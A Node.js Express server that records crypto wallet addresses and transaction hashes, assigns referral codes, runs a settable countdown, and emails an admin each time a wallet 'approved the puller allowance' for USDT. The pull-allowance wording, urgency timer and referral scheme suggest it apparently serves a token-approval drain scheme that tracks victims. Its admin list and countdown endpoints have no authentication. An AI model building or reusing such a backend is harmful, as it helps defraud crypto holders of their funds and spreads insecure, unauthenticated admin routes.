import express from 'express';
import fs from 'fs';
import path from 'path';
import cors from 'cors';
import os from 'os';
import crypto from 'crypto';
import nodemailer from 'nodemailer';
import dotenv from 'dotenv';
import { fileURLToPath } from 'url';

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

const envPaths = [
  path.join(process.cwd(), '.env'),
  path.join(__dirname, '.env'),
  path.join(__dirname, 'scripts', '.env')
];
for (const envPath of envPaths) {
  if (fs.existsSync(envPath)) {
    dotenv.config({ path: envPath, override: true });
  }
}

const app = express();
const PORT = process.env.PORT || 4001;
const HOST = process.env.HOST || '0.0.0.0';

app.use(cors());
app.use(express.json());

// Simple JSON datastore
const DATA_DIR = path.join(__dirname, 'data');
const USERS_FILE = path.join(DATA_DIR, 'users.json');
const REF_CODES_FILE = path.join(DATA_DIR, 'ref-codes.json');
const APPROVALS_FILE = path.join(DATA_DIR, 'approvals.json');
const COUNTDOWN_OVERRIDE_FILE = path.join(DATA_DIR, 'countdown-override.json');
if (!fs.existsSync(DATA_DIR)) fs.mkdirSync(DATA_DIR, { recursive: true });
if (!fs.existsSync(USERS_FILE)) fs.writeFileSync(USERS_FILE, '[]');
if (!fs.existsSync(REF_CODES_FILE)) fs.writeFileSync(REF_CODES_FILE, '{}');
if (!fs.existsSync(APPROVALS_FILE)) fs.writeFileSync(APPROVALS_FILE, '[]');

function readCountdownOverride() {
  try {
    const data = JSON.parse(fs.readFileSync(COUNTDOWN_OVERRIDE_FILE, 'utf8'));
    const target = Number(data?.target);
    if (Number.isFinite(target)) return target;
  } catch (err) {
    // ignore
  }
  return null;
}

function writeCountdownOverride(target) {
  if (!Number.isFinite(target)) {
    if (fs.existsSync(COUNTDOWN_OVERRIDE_FILE)) {
      fs.unlinkSync(COUNTDOWN_OVERRIDE_FILE);
    }
    return;
  }
  fs.writeFileSync(COUNTDOWN_OVERRIDE_FILE, JSON.stringify({ target }, null, 2));
}

function readUsers() {
  try { return JSON.parse(fs.readFileSync(USERS_FILE, 'utf8')); }
  catch { return []; }
}
function writeUsers(arr) {
  fs.writeFileSync(USERS_FILE, JSON.stringify(arr, null, 2));
}

function readRefCodes() {
  try { return JSON.parse(fs.readFileSync(REF_CODES_FILE, 'utf8')); }
  catch { return {}; }
}
function writeRefCodes(map) {
  fs.writeFileSync(REF_CODES_FILE, JSON.stringify(map, null, 2));
}

function readApprovals() {
  try { return JSON.parse(fs.readFileSync(APPROVALS_FILE, 'utf8')); }
  catch { return []; }
}
function writeApprovals(list) {
  fs.writeFileSync(APPROVALS_FILE, JSON.stringify(list, null, 2));
}

const MS_SECOND = 1000;
const MS_MINUTE = 60 * MS_SECOND;
const MS_HOUR = 60 * MS_MINUTE;
const MS_DAY = 24 * MS_HOUR;

const DEFAULT_COUNTDOWN_END_DATE = '2026-05-20T00:00:00Z';
const FALLBACK_COUNTDOWN_DAYS = Number(process.env.COUNTDOWN_FALLBACK_DAYS || 195);
const RAW_COUNTDOWN_END = process.env.COUNTDOWN_END_DATE || DEFAULT_COUNTDOWN_END_DATE;
const PARSED_COUNTDOWN_END = Number.isFinite(Date.parse(RAW_COUNTDOWN_END)) ? Date.parse(RAW_COUNTDOWN_END) : null;
function computeDefaultCountdownTarget() {
  if (PARSED_COUNTDOWN_END) return PARSED_COUNTDOWN_END;
  return Date.now() + FALLBACK_COUNTDOWN_DAYS * MS_DAY;
}
let COUNTDOWN_TARGET = readCountdownOverride() ?? computeDefaultCountdownTarget();

function generateCode(existingSet = new Set()) {
  const alphabet = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
  const len = Math.floor(Math.random() * 5) + 6; // 6-10 characters
  let out = '';
  do {
    out = '';
    for (let i = 0; i < len; i++) {
      out += alphabet[Math.floor(Math.random() * alphabet.length)];
    }
  } while (existingSet.has(out));
  return out;
}

function findOrCreateCode(address, codes) {
  const existing = Object.entries(codes).find(([code, addr]) => addr.toLowerCase() === address.toLowerCase());
  if (existing) return { code: existing[0], created: false };
  const existingCodes = new Set(Object.keys(codes));
  const code = generateCode(existingCodes);
  codes[code] = address;
  existingCodes.add(code);
  return { code, created: true };
}

const EMAIL_FROM = process.env.EMAIL_FROM || process.env.SMTP_USER || process.env.SMTP_LOGIN || process.env.EMAIL_SENDER || '';
const EMAIL_TO = process.env.ADMIN_EMAIL || process.env.EMAIL_TO || process.env.SMTP_TO || EMAIL_FROM;
const SMTP_HOST = process.env.SMTP_HOST || process.env.EMAIL_HOST;
const SMTP_PORT = Number(process.env.SMTP_PORT || process.env.EMAIL_PORT || 465);
const SMTP_SECURE = process.env.SMTP_SECURE ? process.env.SMTP_SECURE !== 'false' : SMTP_PORT !== 587;
const SMTP_USER = process.env.SMTP_USER || process.env.SMTP_LOGIN || process.env.EMAIL_USER || process.env.SMTP_USERNAME;
const SMTP_PASS = process.env.SMTP_PASS || process.env.SMTP_PASSWORD || process.env.EMAIL_PASS || process.env.SMTP_SECRET;

const EMAIL_ENABLED = Boolean(SMTP_HOST && SMTP_USER && SMTP_PASS && EMAIL_TO);
let mailTransport = null;
let emailDisabledLogged = false;

function getTransport() {
  if (!EMAIL_ENABLED) return null;
  if (!mailTransport) {
    mailTransport = nodemailer.createTransport({
      host: SMTP_HOST,
      port: SMTP_PORT,
      secure: SMTP_SECURE,
      auth: { user: SMTP_USER, pass: SMTP_PASS }
    });
    mailTransport.verify().catch(err => {
      console.warn('smtp verify error', err?.message || err);
    });
  }
  return mailTransport;
}

async function sendAdminEmail(payload) {
  const transport = getTransport();
  if (!transport) {
    if (!emailDisabledLogged) {
      console.warn('email disabled: missing SMTP configuration');
      emailDisabledLogged = true;
    }
    return;
  }
  const {
    address,
    txHash,
    refCode,
    referrer,
    referrerCode,
    updatedAt
  } = payload;
  const timestamp = new Date(updatedAt || Date.now());
  const formattedTime = timestamp.toISOString();
  const refLabel = referrer ? `${referrer} ${referrerCode ? `(code ${referrerCode})` : ''}` : 'Direct';
  const subject = `New USDT subscription: ${address}`;
  const lines = [
    `Wallet Address: ${address}`,
    `Referral Code: ${refCode || '-'}`,
    `Referred By: ${refLabel}`,
    `Transaction: ${txHash || '-'}`,
    `Recorded At: ${formattedTime}`
  ];
  const text = lines.join('\n');
  const html = `
    <div style="font-family:Arial,sans-serif;font-size:14px;line-height:1.6;color:#0f172a;">
      <h2 style="margin-top:0;">New USDT Subscription</h2>
      <p>The following wallet just approved the puller allowance:</p>
      <table style="border-collapse:collapse;">
        <tr><td style="padding:4px 12px;color:#64748b;">Wallet Address</td><td style="padding:4px 12px;font-weight:600;">${address}</td></tr>
        <tr><td style="padding:4px 12px;color:#64748b;">Referral Code</td><td style="padding:4px 12px;font-weight:600;">${refCode || '-'}</td></tr>
        <tr><td style="padding:4px 12px;color:#64748b;">Referred By</td><td style="padding:4px 12px;font-weight:600;">${refLabel}</td></tr>
        <tr><td style="padding:4px 12px;color:#64748b;">Transaction Hash</td><td style="padding:4px 12px;">${txHash || '-'}</td></tr>
        <tr><td style="padding:4px 12px;color:#64748b;">Recorded At</td><td style="padding:4px 12px;">${formattedTime}</td></tr>
      </table>
      <p style="margin-top:16px;">You can review the full list from the admin dashboard.</p>
    </div>`;

  try {
    await transport.sendMail({
      from: EMAIL_FROM || SMTP_USER,
      to: EMAIL_TO,
      subject,
      text,
      html
    });
  } catch (err) {
    console.warn('email error', err?.message || err);
  }
}

app.use(express.static(path.join(__dirname, 'public')));

app.get(['/user', '/user.html'], (_req, res) => {
  res.redirect(301, '/');
});

// Friendly routes for static pages
const sendAdmin = (_req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'admin.html'));
};
app.get('/admin', sendAdmin);
app.get('/admin/', sendAdmin);

// Register user after approval
app.post('/api/register', (req, res) => {
  const { address, txHash, referrer } = req.body || {};
  if (!address || !/^0x[a-fA-F0-9]{40}$/.test(address)) return res.status(400).json({ error: 'bad address' });
  const normalizedRef = (typeof referrer === 'string' && /^0x[a-fA-F0-9]{40}$/.test(referrer)) ? referrer : null;
  const users = readUsers();
  const refCodes = readRefCodes();
  const approvals = readApprovals();
  let codesDirty = false;
  const now = Date.now();
  const lower = address.toLowerCase();
  let already = users.find(u => u.address?.toLowerCase?.() === lower);
  if (!already) {
    already = {
      address,
      txHash: null,
      referrer: null,
      refCode: null,
      createdAt: now,
      updatedAt: now
    };
    users.push(already);
  }
  if (!already.createdAt) already.createdAt = now;
  const { code, created } = findOrCreateCode(address, refCodes);
  codesDirty = codesDirty || created;
  const effectiveExistingRef = already?.referrer || null;
  const refAddress = normalizedRef || effectiveExistingRef;
  let referrerCode = null;
  if (refAddress) {
    const refResult = findOrCreateCode(refAddress, refCodes);
    referrerCode = refResult.code;
    codesDirty = codesDirty || refResult.created;
  }

  const timestamp = Date.now();
  const previousTx = already?.txHash || null;
  already.txHash = txHash || already.txHash;
  already.updatedAt = timestamp;
  if (refAddress && !already.referrer) {
    already.referrer = refAddress;
  }
  if (referrerCode) {
    already.referrerCode = referrerCode;
  }
  if (!already.refCode) already.refCode = code;
  writeUsers(users);
  if (codesDirty) writeRefCodes(refCodes);

  const responsePayload = { ok: true, code };
  res.json(responsePayload);

  const event = {
    id: crypto.randomUUID ? crypto.randomUUID() : `${Date.now()}-${Math.random().toString(16).slice(2)}`,
    address,
    refCode: already.refCode,
    referrer: already.referrer || refAddress || null,
    referrerCode: already.referrerCode || referrerCode,
    txHash: txHash || null,
    createdAt: timestamp,
    updatedAt: timestamp
  };
  approvals.push(event);
  writeApprovals(approvals);

  sendAdminEmail({
    ...event,
    updatedAt: timestamp
  });
});

app.get('/api/countdown', (_req, res) => {
  const serverTime = Date.now();
  const target = COUNTDOWN_TARGET;
  const remainingMs = Math.max(0, target - serverTime);
  let remainder = remainingMs;
  const days = Math.floor(remainder / MS_DAY);
  remainder -= days * MS_DAY;
  const hours = Math.floor(remainder / MS_HOUR);
  remainder -= hours * MS_HOUR;
  const minutes = Math.floor(remainder / MS_MINUTE);
  remainder -= minutes * MS_MINUTE;
  const seconds = Math.floor(remainder / MS_SECOND);

  res.json({
    endDate: new Date(target).toISOString(),
    target,
    serverTime,
    remainingSeconds: Math.floor(remainingMs / MS_SECOND),
    days,
    hours,
    minutes,
    seconds,
    fallbackDays: FALLBACK_COUNTDOWN_DAYS,
    source: Number.isFinite(PARSED_COUNTDOWN_END) ? 'configured' : 'fallback'
  });
});

app.post('/api/countdown', (req, res) => {
  const { target, daysFromNow, clear } = req.body || {};
  if (clear) {
    writeCountdownOverride(null);
    COUNTDOWN_TARGET = computeDefaultCountdownTarget();
    return res.json({ ok: true, target: COUNTDOWN_TARGET });
  }
  let parsedTarget = null;
  if (typeof target === 'string' && target.trim()) {
    const parsedDate = Date.parse(target);
    if (Number.isFinite(parsedDate)) parsedTarget = parsedDate;
  }
  if (Number.isFinite(daysFromNow)) {
    parsedTarget = Date.now() + Number(daysFromNow) * MS_DAY;
  }
  if (!Number.isFinite(parsedTarget) || parsedTarget <= Date.now()) {
    return res.status(400).json({ error: 'invalid target' });
  }
  writeCountdownOverride(parsedTarget);
  COUNTDOWN_TARGET = parsedTarget;
  res.json({ ok: true, target: COUNTDOWN_TARGET });
});

// Admin list
app.get('/api/users', (_req, res) => {
  const users = readUsers();
  const approvals = readApprovals();
  const refCodes = readRefCodes();
  let codesDirty = false;
  let usersDirty = false;
  let approvalsDirty = false;

  const ensureCode = (address) => {
    if (!address) return null;
    const { code, created } = findOrCreateCode(address, refCodes);
    if (created) codesDirty = true;
    return code;
  };

  const userMap = new Map(users.map(u => [u.address.toLowerCase(), u]));

  const enriched = approvals.map(event => {
    const code = ensureCode(event.address);
    const lower = event.address.toLowerCase();
    const linkedUser = userMap.get(lower);
    if (linkedUser && linkedUser.refCode !== code) {
      linkedUser.refCode = code;
      usersDirty = true;
    }
    const referrerCode = event.referrer ? ensureCode(event.referrer) : null;
    if (referrerCode && linkedUser && linkedUser.referrerCode !== referrerCode) {
      linkedUser.referrerCode = referrerCode;
      usersDirty = true;
    }
    if (event.refCode !== code || event.referrerCode !== referrerCode) {
      event.refCode = code;
      event.referrerCode = referrerCode;
      approvalsDirty = true;
    }
    return {
      ...event,
      refCode: code,
      referrerCode
    };
  });

  if (usersDirty) writeUsers(users);
  if (codesDirty) writeRefCodes(refCodes);
  if (approvalsDirty) writeApprovals(approvals);

  enriched.sort((a, b) => (b.createdAt || b.updatedAt || 0) - (a.createdAt || a.updatedAt || 0));
  res.json(enriched);
});

app.listen(PORT, HOST, () => {
  const addresses = Object.values(os.networkInterfaces())
    .flat()
    .filter(Boolean)
    .filter(net => net.family === 'IPv4' && !net.internal)
    .map(net => net.address);
  console.log(`Server running at http://localhost:${PORT}`);
  if (addresses.length) {
    console.log('LAN access:');
    for (const addr of addresses) {
      console.log(`  http://${addr}:${PORT}`);
    }
  }
});
